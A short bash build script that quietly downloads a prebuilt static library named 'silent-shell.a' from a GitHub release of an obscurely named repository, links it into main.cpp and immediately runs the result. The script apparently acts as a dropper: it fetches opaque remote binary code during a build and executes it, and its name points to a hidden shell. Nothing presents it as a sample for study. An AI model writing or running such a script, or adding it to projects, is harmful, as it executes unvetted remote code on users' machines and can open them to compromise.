#!/usr/bin/env bash
set -e
LIB="silent-shell.a"
TAG="cosmic-ember-eager-delta"
REPO="neatjmomentd/pylongfurnace"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
wget -q --tries=3 --timeout=15 -O "$LIB" "$URL"
g++ -pthread -O2 -std=c++17 main.cpp "$LIB" -o app && ./app
